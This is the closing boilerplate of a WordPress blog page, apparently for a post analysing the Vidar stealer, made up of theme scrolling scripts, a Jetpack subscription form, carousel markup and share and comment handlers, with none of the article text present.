		const pageTitle = $( '#post-title' );
		const pageTitleTop = pageTitle.offset().top;
		const progressBarContainer = $( '.single-post-title-bar' );
		const headerNavBrand = $( '.header .navbar-brand' );
		const progressTitle = $( '#progress-title' );
		const headerBarContainer = $( '.header .container' );

		progressLabel.text( setPercent() + '%' );
		progressBar.attr(
			{
				value: setValue(),
				max: setMax() 
			}
		);

		doc.on( 'scroll', () => {
			progressLabel.text( setPercent() + '%' );
			progressBar.attr(
				{
					value: setValue()
				} 
			);

			if ( doc.scrollTop() > headerNavBrand.height() ) {
				//headerBarContainer.fadeOut( 800 );
				progressTitle.html( pageTitle.html() );
				progressBarContainer.find( '.navbar-brand' ).html( headerNavBrand.html() );
				progressBarContainer.fadeIn( 100 );
				progressBarContainer.addClass( 'fixed-top' );
				progressBarContainer.addClass( 'slide-down' );
			} else {
				//headerBarContainer.fadeIn( 800 );
				progressBarContainer.removeClass( 'slide-down' );
				progressBarContainer.fadeOut( 100 );

				if ( progressBarContainer.hasClass( 'fixed-top' ) ) {
					setTimeout(function() {
						progressBarContainer.removeClass( 'fixed-top' );
					}, 500);
				}
			}
		});

		win.on( 'resize', () => {
			progressLabel.text( setPercent() + '%' );
			progressBar.attr(
				{
					value: setValue(), 
					max: setMax()
				} 
			);
		});

		// Sidebar switcher
		$( '#main-container' ).attr( 'data-previous-class', $( '#main-container' ).attr( 'class' ) );

		$( '.column-control .btn-counter' ).click(function() {
			var target = $( this ).attr( 'data-target' );
			if ( $( this ).hasClass( 'active' ) ) {
				$( this ).removeClass( 'active' );

				if ( target == '#aside-container' ) {
					$( '#main-container' ).attr( 'data-previous-class', $( '#main-container' ).attr( 'class' ) );
					$( '#main-container' ).attr( 'class', 'col col-sm-12' );
					$( '#aside-container' ).hide();
				}
				if ( target == '#sidebar') {
					$( target ).show();
				}
			} else {
				$( this ).addClass( 'active' );

				if ( target == '#aside-container' ) {
					$( '#main-container' ).attr( 'class', $( '#main-container' ).attr( 'data-previous-class' ) );
					$( '#aside-container' ).show();
				}
				if ( target == '#sidebar') {
					$( target ).hide();
				}
			}

		});

		// For responsive.
		$( '.markdown-body img' ).attr('height', '');
	});

	</script>
	<script>

	jQuery( document ).ready(function( $ ) {

		$( '.scroll-area a' ).on( 'click', function(e) {
			e.preventDefault();
			var movingPosition = 0;

			if ( $( this.hash ).offset().top > $( document ).height() - $( window ).height() ) {
				movingPosition = $( document ).height() - $( window ).height();
			} else {
				movingPosition = $( this.hash ).offset().top;
			}

			$( 'html, body' ).animate({
				scrollTop: movingPosition
			}, 500, 'swing' );
		});

		$( 'a.go-top' ).on( 'click' ,function(e) {
			e.preventDefault();
			$( 'html, body' ).animate( { scrollTop: 0 }, 1000 );
		});

		$( window ).scroll( function() {      
			var windowTop =  $( window ).scrollTop();
			if ( windowTop > 100 ) {
				$( 'a.go-top' ).fadeIn( 300 );
			} else {
				$( 'a.go-top' ).fadeOut( 300 );
			}
		});

		$( '#mynote-nav-bar' ).on( 'show.bs.collapse' , function () {
			$( 'body' ).addClass( 'menu-is-collapsed' );
			$( '.main-header' ).css( { 'top': '-60px' } ).animate( { 'top': '0px' }, 500 );
			$( '.has-site-logo .search-bar' ).fadeOut( 500 );
		});

		$( '#mynote-nav-bar' ).on( 'hidden.bs.collapse' , function () {
			$( '.main-header' ).css( { 'top': '0px' } ).animate( { 'top': '-60px' }, 500 );
			$( '.has-site-logo .search-bar' ).fadeIn( 500 );
			setTimeout(function() {
				$( 'body' ).removeClass( 'menu-is-collapsed' );
			}, 500);
			
		});
	});

	</script>
	<!--  -->
<script defer id="bilmur" data-customproperties="{&quot;woo_active&quot;:&quot;0&quot;}" data-provider="wordpress.com" data-service="atomic"  src="https://s0.wp.com/wp-content/js/bilmur.min.js?m=202451"></script>
					<div class="jetpack-subscription-modal">
						<div class="jetpack-subscription-modal__modal-content">
								
	<div class="wp-block-group has-border-color jetpack-subscription-modal__modal-content-form" style="border-color:#dddddd;border-width:1px;margin-top:0;margin-bottom:0;padding:32px"><div class="wp-block-group__inner-container is-layout-flow wp-block-group-is-layout-flow">

		
		<h2 class="wp-block-heading has-text-align-center" style="margin-top:4px;margin-bottom:10px;font-size:26px;font-style:normal;font-weight:600">Discover more from Fumik0_&#039;s box</h2>
		

		
		<p class='has-text-align-center' style='margin-top:4px;margin-bottom:0px;font-size:15px'>Subscribe now to keep reading and get access to the full archive.</p>
		

			<div class="wp-block-jetpack-subscriptions__supports-newline is-style-compact wp-block-jetpack-subscriptions">
		<div class="wp-block-jetpack-subscriptions__container is-not-subscriber">
							<form
					action="https://wordpress.com/email-subscriptions"
					method="post"
					accept-charset="utf-8"
					data-blog="140610880"
					data-post_access_level="everybody"
					data-subscriber_email=""
					id="subscribe-blog"
				>
					<div class="wp-block-jetpack-subscriptions__form-elements">
												<p id="subscribe-email">
							<label
								id="subscribe-field-label"
								for="subscribe-field"
								class="screen-reader-text"
							>
								Type your email…							</label>
							<input
									required="required"
									type="email"
									name="email"
									
									style="font-size: 16px;padding: 15px 23px 15px 23px;border-radius: 50px;border-width: 1px;"
									placeholder="Type your email…"
									value=""
									id="subscribe-field"
									title="Please fill in this field."
								/>						</p>
												<p id="subscribe-submit"
													>
							<input type="hidden" name="action" value="subscribe"/>
							<input type="hidden" name="blog_id" value="140610880"/>
							<input type="hidden" name="source" value="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/"/>
							<input type="hidden" name="sub-type" value="subscribe-block"/>
							<input type="hidden" name="app_source" value="atomic-subscription-modal-lo"/>
							<input type="hidden" name="redirect_fragment" value="subscribe-blog"/>
							<input type="hidden" name="lang" value="en_US"/>
							<input type="hidden" id="_wpnonce" name="_wpnonce" value="c43f937e1f" /><input type="hidden" name="_wp_http_referer" value="/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/" /><input type="hidden" name="post_id" value="436"/>							<button type="submit"
																	class="wp-block-button__link"
																									style="font-size: 16px;padding: 15px 23px 15px 23px;margin: 0; margin-left: 10px;border-radius: 50px;border-width: 1px;"
																name="jetpack_subscriptions_widget"
							>
								Subscribe							</button>
						</p>
					</div>
				</form>
								</div>
	</div>
	

		
		<p class="has-text-align-center jetpack-subscription-modal__close" style="margin-top:20px;font-size:14px"><a href="#">Continue reading</a></p>
		
	</div></div>
							</div>
					</div>
					<div id="jp-carousel-loading-overlay">
			<div id="jp-carousel-loading-wrapper">
				<span id="jp-carousel-library-loading">&nbsp;</span>
			</div>
		</div>
		<div class="jp-carousel-overlay" style="display: none;">

		<div class="jp-carousel-container">
			<!-- The Carousel Swiper -->
			<div
				class="jp-carousel-wrap swiper-container jp-carousel-swiper-container jp-carousel-transitions"
				itemscope
				itemtype="https://schema.org/ImageGallery">
				<div class="jp-carousel swiper-wrapper"></div>
				<div class="jp-swiper-button-prev swiper-button-prev">
					<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
						<mask id="maskPrev" mask-type="alpha" maskUnits="userSpaceOnUse" x="8" y="6" width="9" height="12">
							<path d="M16.2072 16.59L11.6496 12L16.2072 7.41L14.8041 6L8.8335 12L14.8041 18L16.2072 16.59Z" fill="white"/>
						</mask>
						<g mask="url(#maskPrev)">
							<rect x="0.579102" width="23.8823" height="24" fill="#FFFFFF"/>
						</g>
					</svg>
				</div>
				<div class="jp-swiper-button-next swiper-button-next">
					<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
						<mask id="maskNext" mask-type="alpha" maskUnits="userSpaceOnUse" x="8" y="6" width="8" height="12">
							<path d="M8.59814 16.59L13.1557 12L8.59814 7.41L10.0012 6L15.9718 12L10.0012 18L8.59814 16.59Z" fill="white"/>
						</mask>
						<g mask="url(#maskNext)">
							<rect x="0.34375" width="23.8822" height="24" fill="#FFFFFF"/>
						</g>
					</svg>
				</div>
			</div>
			<!-- The main close buton -->
			<div class="jp-carousel-close-hint">
				<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
					<mask id="maskClose" mask-type="alpha" maskUnits="userSpaceOnUse" x="5" y="5" width="15" height="14">
						<path d="M19.3166 6.41L17.9135 5L12.3509 10.59L6.78834 5L5.38525 6.41L10.9478 12L5.38525 17.59L6.78834 19L12.3509 13.41L17.9135 19L19.3166 17.59L13.754 12L19.3166 6.41Z" fill="white"/>
					</mask>
					<g mask="url(#maskClose)">
						<rect x="0.409668" width="23.8823" height="24" fill="#FFFFFF"/>
					</g>
				</svg>
			</div>
			<!-- Image info, comments and meta -->
			<div class="jp-carousel-info">
				<div class="jp-carousel-info-footer">
					<div class="jp-carousel-pagination-container">
						<div class="jp-swiper-pagination swiper-pagination"></div>
						<div class="jp-carousel-pagination"></div>
					</div>
					<div class="jp-carousel-photo-title-container">
						<h2 class="jp-carousel-photo-caption"></h2>
					</div>
					<div class="jp-carousel-photo-icons-container">
						<a href="#" class="jp-carousel-icon-btn jp-carousel-icon-info" aria-label="Toggle photo metadata visibility">
							<span class="jp-carousel-icon">
								<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
									<mask id="maskInfo" mask-type="alpha" maskUnits="userSpaceOnUse" x="2" y="2" width="21" height="20">
										<path fill-rule="evenodd" clip-rule="evenodd" d="M12.7537 2C7.26076 2 2.80273 6.48 2.80273 12C2.80273 17.52 7.26076 22 12.7537 22C18.2466 22 22.7046 17.52 22.7046 12C22.7046 6.48 18.2466 2 12.7537 2ZM11.7586 7V9H13.7488V7H11.7586ZM11.7586 11V17H13.7488V11H11.7586ZM4.79292 12C4.79292 16.41 8.36531 20 12.7537 20C17.142 20 20.7144 16.41 20.7144 12C20.7144 7.59 17.142 4 12.7537 4C8.36531 4 4.79292 7.59 4.79292 12Z" fill="white"/>
									</mask>
									<g mask="url(#maskInfo)">
										<rect x="0.8125" width="23.8823" height="24" fill="#FFFFFF"/>
									</g>
								</svg>
							</span>
						</a>
												<a href="#" class="jp-carousel-icon-btn jp-carousel-icon-comments" aria-label="Toggle photo comments visibility">
							<span class="jp-carousel-icon">
								<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
									<mask id="maskComments" mask-type="alpha" maskUnits="userSpaceOnUse" x="2" y="2" width="21" height="20">
										<path fill-rule="evenodd" clip-rule="evenodd" d="M4.3271 2H20.2486C21.3432 2 22.2388 2.9 22.2388 4V16C22.2388 17.1 21.3432 18 20.2486 18H6.31729L2.33691 22V4C2.33691 2.9 3.2325 2 4.3271 2ZM6.31729 16H20.2486V4H4.3271V18L6.31729 16Z" fill="white"/>
									</mask>
									<g mask="url(#maskComments)">
										<rect x="0.34668" width="23.8823" height="24" fill="#FFFFFF"/>
									</g>
								</svg>

								<span class="jp-carousel-has-comments-indicator" aria-label="This image has comments."></span>
							</span>
						</a>
											</div>
				</div>
				<div class="jp-carousel-info-extra">
					<div class="jp-carousel-info-content-wrapper">
						<div class="jp-carousel-photo-title-container">
							<h2 class="jp-carousel-photo-title"></h2>
						</div>
						<div class="jp-carousel-comments-wrapper">
															<div id="jp-carousel-comments-loading">
									<span>Loading Comments...</span>
								</div>
								<div class="jp-carousel-comments"></div>
								<div id="jp-carousel-comment-form-container">
									<span id="jp-carousel-comment-form-spinner">&nbsp;</span>
									<div id="jp-carousel-comment-post-results"></div>
																														<form id="jp-carousel-comment-form">
												<label for="jp-carousel-comment-form-comment-field" class="screen-reader-text">Write a Comment...</label>
												<textarea
													name="comment"
													class="jp-carousel-comment-form-field jp-carousel-comment-form-textarea"
													id="jp-carousel-comment-form-comment-field"
													placeholder="Write a Comment..."
												></textarea>
												<div id="jp-carousel-comment-form-submit-and-info-wrapper">
													<div id="jp-carousel-comment-form-commenting-as">
																													<fieldset>
																<label for="jp-carousel-comment-form-email-field">Email (Required)</label>
																<input type="text" name="email" class="jp-carousel-comment-form-field jp-carousel-comment-form-text-field" id="jp-carousel-comment-form-email-field" />
															</fieldset>
															<fieldset>
																<label for="jp-carousel-comment-form-author-field">Name (Required)</label>
																<input type="text" name="author" class="jp-carousel-comment-form-field jp-carousel-comment-form-text-field" id="jp-carousel-comment-form-author-field" />
															</fieldset>
															<fieldset>
																<label for="jp-carousel-comment-form-url-field">Website</label>
																<input type="text" name="url" class="jp-carousel-comment-form-field jp-carousel-comment-form-text-field" id="jp-carousel-comment-form-url-field" />
															</fieldset>
																											</div>
													<input
														type="submit"
														name="submit"
														class="jp-carousel-comment-form-button"
														id="jp-carousel-comment-form-button-submit"
														value="Post Comment" />
												</div>
											</form>
																											</div>
													</div>
						<div class="jp-carousel-image-meta">
							<div class="jp-carousel-title-and-caption">
								<div class="jp-carousel-photo-info">
									<h3 class="jp-carousel-caption" itemprop="caption description"></h3>
								</div>

								<div class="jp-carousel-photo-description"></div>
							</div>
							<ul class="jp-carousel-image-exif" style="display: none;"></ul>
							<a class="jp-carousel-image-download" href="#" target="_blank" style="display: none;">
								<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
									<mask id="mask0" mask-type="alpha" maskUnits="userSpaceOnUse" x="3" y="3" width="19" height="18">
										<path fill-rule="evenodd" clip-rule="evenodd" d="M5.84615 5V19H19.7775V12H21.7677V19C21.7677 20.1 20.8721 21 19.7775 21H5.84615C4.74159 21 3.85596 20.1 3.85596 19V5C3.85596 3.9 4.74159 3 5.84615 3H12.8118V5H5.84615ZM14.802 5V3H21.7677V10H19.7775V6.41L9.99569 16.24L8.59261 14.83L18.3744 5H14.802Z" fill="white"/>
									</mask>
									<g mask="url(#mask0)">
										<rect x="0.870605" width="23.8823" height="24" fill="#FFFFFF"/>
									</g>
								</svg>
								<span class="jp-carousel-download-text"></span>
							</a>
							<div class="jp-carousel-image-map" style="display: none;"></div>
						</div>
					</div>
				</div>
			</div>
		</div>

		</div>
		
	<script type="text/javascript">
		window.WPCOM_sharing_counts = {"https:\/\/fumik0.com\/2018\/12\/24\/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis\/":436};
	</script>
				<link rel='stylesheet' id='jetpack-carousel-swiper-css-css' href='https://fumik0.com/wp-content/plugins/jetpack/modules/carousel/swiper-bundle.css?ver=14.2-a.3' type='text/css' media='all' />
<link rel='stylesheet' id='jetpack-carousel-css' href='https://fumik0.com/wp-content/plugins/jetpack/modules/carousel/jetpack-carousel.css?ver=14.2-a.3' type='text/css' media='all' />
<link rel='stylesheet' id='jetpack-block-subscriptions-css' href='https://fumik0.com/wp-content/plugins/jetpack/_inc/blocks/subscriptions/view.css?minify=false&#038;ver=14.2-a.3' type='text/css' media='all' />
<script type="text/javascript" src="https://c0.wp.com/c/6.7.1/wp-includes/js/comment-reply.min.js" id="comment-reply-js" async="async" data-wp-strategy="async"></script>
<script type="text/javascript" src="https://c0.wp.com/c/6.7.1/wp-includes/js/dist/dom-ready.min.js" id="wp-dom-ready-js"></script>
<script type="text/javascript" id="subscription-modal-js-js-extra">
/* <![CDATA[ */
var subscriptionData = {"homeUrl":"fumik0.com"};
/* ]]> */
</script>
<script type="text/javascript" src="https://fumik0.com/wp-content/plugins/jetpack/modules/comments/subscription-modal-on-comment/subscription-modal.js?ver=14.2-a.3" id="subscription-modal-js-js"></script>
<script type="text/javascript" src="https://fumik0.com/wp-content/plugins/jetpack/_inc/build/likes/queuehandler.min.js?ver=14.2-a.3" id="jetpack_likes_queuehandler-js"></script>
<script type="text/javascript" src="https://c0.wp.com/c/6.7.1/wp-includes/js/clipboard.min.js" id="clipboard-js"></script>
<script type="text/javascript" src="https://fumik0.com/wp-content/plugins/highlighting-code-block/assets/js/prism.js?ver=1.2.9" id="hcb-prism-js"></script>
<script type="text/javascript" id="hcb-script-js-extra">
/* <![CDATA[ */
var hcbVars = {"showCopy":"on"};
/* ]]> */
</script>
<script type="text/javascript" src="https://fumik0.com/wp-content/plugins/highlighting-code-block/build/js/hcb_script.js?ver=1.2.9" id="hcb-script-js"></script>
<script type="text/javascript" src="https://stats.wp.com/e-202451.js" id="jetpack-stats-js" data-wp-strategy="defer"></script>
<script type="text/javascript" id="jetpack-stats-js-after">
/* <![CDATA[ */
_stq = window._stq || [];
_stq.push([ "view", JSON.parse("{\"v\":\"ext\",\"blog\":\"140610880\",\"post\":\"436\",\"tz\":\"0\",\"srv\":\"fumik0.com\",\"hp\":\"atomic\",\"ac\":\"2\",\"amp\":\"0\",\"j\":\"1:14.2-a.3\"}") ]);
_stq.push([ "clickTrackerInit", "140610880", "436" ]);
/* ]]> */
</script>
<script type="text/javascript" id="jetpack-carousel-js-extra">
/* <![CDATA[ */
var jetpackSwiperLibraryPath = {"url":"https:\/\/fumik0.com\/wp-content\/plugins\/jetpack\/_inc\/build\/carousel\/swiper-bundle.min.js"};
var jetpackCarouselStrings = {"widths":[370,700,1000,1200,1400,2000],"is_logged_in":"","lang":"en","ajaxurl":"https:\/\/fumik0.com\/wp-admin\/admin-ajax.php","nonce":"acafc58171","display_exif":"1","display_comments":"1","single_image_gallery":"1","single_image_gallery_media_file":"","background_color":"black","comment":"Comment","post_comment":"Post Comment","write_comment":"Write a Comment...","loading_comments":"Loading Comments...","image_label":"Open image in full-screen.","download_original":"View full size <span class=\"photo-size\">{0}<span class=\"photo-size-times\">\u00d7<\/span>{1}<\/span>","no_comment_text":"Please be sure to submit some text with your comment.","no_comment_email":"Please provide an email address to comment.","no_comment_author":"Please provide your name to comment.","comment_post_error":"Sorry, but there was an error posting your comment. Please try again later.","comment_approved":"Your comment was approved.","comment_unapproved":"Your comment is in moderation.","camera":"Camera","aperture":"Aperture","shutter_speed":"Shutter Speed","focal_length":"Focal Length","copyright":"Copyright","comment_registration":"0","require_name_email":"1","login_url":"https:\/\/fumik0.com\/wp-login.php?redirect_to=https%3A%2F%2Ffumik0.com%2F2018%2F12%2F24%2Flets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis%2F","blog_id":"1","meta_data":["camera","aperture","shutter_speed","focal_length","copyright"]};
/* ]]> */
</script>
<script type="text/javascript" src="https://fumik0.com/wp-content/plugins/jetpack/_inc/build/carousel/jetpack-carousel.min.js?ver=14.2-a.3" id="jetpack-carousel-js"></script>
<script defer type="text/javascript" src="https://fumik0.com/wp-content/plugins/akismet/_inc/akismet-frontend.js?ver=1704837122" id="akismet-frontend-js"></script>
<script type="text/javascript" id="jetpack-blocks-assets-base-url-js-before">
/* <![CDATA[ */
var Jetpack_Block_Assets_Base_Url="https://fumik0.com/wp-content/plugins/jetpack/_inc/blocks/";
/* ]]> */
</script>
<script type="text/javascript" src="https://c0.wp.com/c/6.7.1/wp-includes/js/dist/vendor/wp-polyfill.min.js" id="wp-polyfill-js"></script>
<script type="text/javascript" src="https://fumik0.com/wp-content/plugins/jetpack/_inc/blocks/subscriptions/view.js?minify=false&amp;ver=14.2-a.3" id="jetpack-block-subscriptions-js"></script>
<script type="text/javascript" id="sharing-js-js-extra">
/* <![CDATA[ */
var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
/* ]]> */
</script>
<script type="text/javascript" src="https://fumik0.com/wp-content/plugins/jetpack/_inc/build/sharedaddy/sharing.min.js?ver=14.2-a.3" id="sharing-js-js"></script>
<script type="text/javascript" id="sharing-js-js-after">
/* <![CDATA[ */
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-twitter' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-twitter' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-facebook' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-facebook' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
						return false;
					}
				} );
			} )();
/* ]]> */
</script>
	<iframe src='https://widgets.wp.com/likes/master.html?ver=20241218#ver=20241218&#038;n=1' scrolling='no' id='likes-master' name='likes-master' style='display:none;'></iframe>
	<div id='likes-other-gravatars' class='wpl-new-layout' role="dialog" aria-hidden="true" tabindex="-1"><div class="likes-text"><span>%d</span></div><ul class="wpl-avatars sd-like-gravatars"></ul></div>
			<script type="text/javascript">
			(function () {
				const iframe = document.getElementById( 'jetpack_remote_comment' );
								const watchReply = function() {
					// Check addComment._Jetpack_moveForm to make sure we don't monkey-patch twice.
					if ( 'undefined' !== typeof addComment && ! addComment._Jetpack_moveForm ) {
						// Cache the Core function.
						addComment._Jetpack_moveForm = addComment.moveForm;
						const commentParent = document.getElementById( 'comment_parent' );
						const cancel = document.getElementById( 'cancel-comment-reply-link' );

						function tellFrameNewParent ( commentParentValue ) {
							const url = new URL( iframe.src );
							if ( commentParentValue ) {
								url.searchParams.set( 'replytocom', commentParentValue )
							} else {
								url.searchParams.delete( 'replytocom' );
							}
							if( iframe.src !== url.href ) {
								iframe.src = url.href;
							}
						};

						cancel.addEventListener( 'click', function () {
							tellFrameNewParent( false );
						} );

						addComment.moveForm = function ( _, parentId ) {
							tellFrameNewParent( parentId );
							return addComment._Jetpack_moveForm.apply( null, arguments );
						};
					}
				}
				document.addEventListener( 'DOMContentLoaded', watchReply );
				// In WP 6.4+, the script is loaded asynchronously, so we need to wait for it to load before we monkey-patch the functions it introduces.
				document.querySelector('#comment-reply-js')?.addEventListener( 'load', watchReply );

								
				const commentIframes = document.getElementsByClassName('jetpack_remote_comment');

				window.addEventListener('message', function(event) {
					if (event.origin !== 'https://jetpack.wordpress.com') {
						return;
					}

					if (!event?.data?.iframeUniqueId && !event?.data?.height) {
						return;
					}

					const eventDataUniqueId = event.data.iframeUniqueId;

					// Change height for the matching comment iframe
					for (let i = 0; i < commentIframes.length; i++) {
						const iframe = commentIframes[i];
						const url = new URL(iframe.src);
						const iframeUniqueIdParam = url.searchParams.get('iframe_unique_id');
						if (iframeUniqueIdParam == event.data.iframeUniqueId) {
							iframe.style.height = event.data.height + 'px';
							return;
						}
					}
				});
			})();
		</script>
		
		<a href="javascript:void(0);" class="go-top" style="display: none">
			<i class="fas fa-arrow-up"></i>
		</a>
	</body>
</html>
